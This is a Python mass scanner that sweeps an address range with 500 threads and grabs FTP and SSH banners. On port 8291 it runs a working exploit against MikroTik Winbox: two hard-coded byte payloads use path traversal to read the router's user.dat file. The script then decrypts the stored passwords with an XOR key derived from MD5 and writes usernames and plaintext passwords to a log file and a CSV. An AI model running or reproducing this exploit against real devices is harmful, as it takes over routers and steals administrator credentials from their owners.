#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
@author:       anton
@description:  Quick and dirty scanner using threading to speed up the scanning process. 
"""

import os
import hashlib
import time
import socket
import threading
import ipcalc
import argparse
import logging
import pandas as pd
import numpy as np
from queue import Queue

# PORTS
PORTS = []
SCAN = []

FIRST_PAYLOAD = \
    [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
     0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
     0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
     0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
     0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
     0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
     0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
     0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
     0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
     0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
     0x00, 0x00]


SECOND_PAYLOAD = \
    [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
     0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
     0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
     0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
     0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
     0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
     0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
     0x00, 0x02, 0x00, 0x00, 0x00]

RequestHeader = ('\x12\x02')
RequestFirstFooter = ('\xFF\xED\x00\x00\x00\x00')
winboxStartingIndex=(RequestHeader + 'index' + '\x00'*7 + RequestFirstFooter).encode()

# Start logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b'283i4jfkai3389').digest()

    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])

    return passw.split('\x00')[0]

def extract_user_pass_from_entry(entry):
    user_data = entry.split(b'\x01\x00\x00\x21')[1]
    pass_data = entry.split(b'\x11\x00\x00\x21')[1]

    user_len = user_data[0]
    pass_len = pass_data[0]

    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]

    return username, password

def get_pair(data):

    user_list = []

    entries = data.split(b'M2')[1:]
    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
        except:
            continue

        pass_plain = decrypt_password(user, pass_encrypted)
        user  = user.decode('ascii')

        user_list.append((user, pass_plain))

    return user_list

def dump(data, x):
    user_pass = get_pair(data)
    for user, passwd in user_pass:
        logger.info('{} - {}:{}'.format(x, user, passwd))
    return user_pass

def TCP_connect(worker):
    global SCAN

    results = {}
    worker = worker.split(':')
    ip = str(worker[0])
    port = int(worker[1])

    for res in socket.getaddrinfo(ip, port, socket.AF_UNSPEC, socket.SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        try:
            s = socket.socket(af, socktype, proto)
            s.settimeout(3)
        except (socket.error):
            s.close()
            s = None
            continue

        try:
            s.connect(sa)
            user_pass = None
            if port == 21 or port == 22:
                banner = s.recv(1024)
            elif port == 8291:
                try:
                    #Convert to bytearray for manipulation
                    a = bytearray(FIRST_PAYLOAD)
                    b = bytearray(SECOND_PAYLOAD)

                    #Send hello and recieve the sesison id
                    s.send(a)
                    d = bytearray(s.recv(1024))

                    #Replace the session id in template
                    b[19] = d[38]

                    #Send the edited response
                    s.send(b)
                    d = bytearray(s.recv(1024))

                    #Get results
                    user_pass = dump(d[55:], sa[0])

                    banner = 'Vulnerable'
                except:
                    banner = None
            else:
                banner = None

            results['ip'] = ip
            results['port'] = port
            results['status'] = 'open'

            if user_pass is not None:
                results['creds'] = user_pass
            else:
                results['creds'] = np.nan

            if banner is not None:
                if port == 21 or port == 22:
                    try:
                        results['banner'] = banner.strip().decode('utf-8')
                    except:
                        results['banner'] = np.nan
                else:
                    try:
                        results['banner'] = banner.strip().decode('utf-8')
                    except:
                        results['banner'] = np.nan
            else:
                results['banner'] = np.nan

            logger.debug(results)
            SCAN.append(results)
        except (socket.error):
            s.close()
            s = None
            continue
        break
    if s is None:
        pass

# The threader thread pulls an worker from the queue and processes it
def threader(q):

    while True:
        # gets an worker from the queue
        worker = q.get()
        # Run the example job with the avail worker in queue (thread)
        TCP_connect(worker)

        # completed with the job
        q.task_done()

def main(args):
    global PORTS

    print('\nSTARTING SCAN\n')
    print('RANGE: {}'.format(args.range))

    # Create the Handler for logging data to a file
    log_file = '{}/scan.log'.format(os.getcwd())
    logger_handler = logging.FileHandler(log_file)
    logger_handler.setLevel(logging.DEBUG)

    # Create a Formatter for formatting the log messages
    logger_formatter = logging.Formatter('[%(levelname)s] - %(message)s')

    # Add the Formatter to the Handler
    logger_handler.setFormatter(logger_formatter)

    # Add the Handler to the Logger
    logger.addHandler(logger_handler)
    logger.info('Starting to scan')

    if args.ports:
        PORTS = args.ports.split(',')
        PORTS = list(map(int, PORTS))
    else:
        for i in range(1,65535):
            PORTS.append(i)

    q = Queue()

    for x in range(500):
        t = threading.Thread(target=threader, args=(q,))
        t.daemon = True
        t.start()

    start = time.time()
    logger.info('Scan timer started')

    for ip in ipcalc.Network(args.range):
        #rep = os.system('ping -c 1  {}'.format(ip))

        #if rep == 0:
        for port in PORTS:
            worker = '{}:{}'.format(ip, port)
            q.put(worker)
        #else:
        #    logger.debug('{} appears to be down'.format(ip))

    q.join()

    stop = time.time()

    total_time = stop - start
    print('\nTOTAL RUN TIME: {}'.format(round(total_time, 4)))
    logger.info('Scan took {} seconds to complete'.format(round(total_time, 4)))
    df = pd.DataFrame(SCAN)
    df.to_csv('dump.csv', index=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', '--range', help='CIDR Block to scan')
    parser.add_argument('-p', '--ports', help='Comma-separated port list: 21,22,8080')
    args = parser.parse_args()
    main(args)
